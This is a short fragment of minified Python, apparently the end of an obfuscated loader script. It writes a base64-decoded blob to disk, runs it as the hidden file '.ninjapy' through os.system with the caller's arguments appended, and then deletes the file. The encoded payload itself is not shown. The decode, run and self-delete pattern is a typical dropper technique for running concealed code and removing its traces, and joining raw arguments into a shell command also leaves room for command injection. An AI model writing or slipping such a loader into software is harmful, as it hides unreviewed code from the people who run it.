try:
	with open(A,'wb')as D:D.write(B.b64decode(C))
	os.system('python3 .ninjapy '+' '.join(sys.argv[1:]))
except Exception as E:print(E)
finally:
	if os.path.exists(A):os.remove(A)
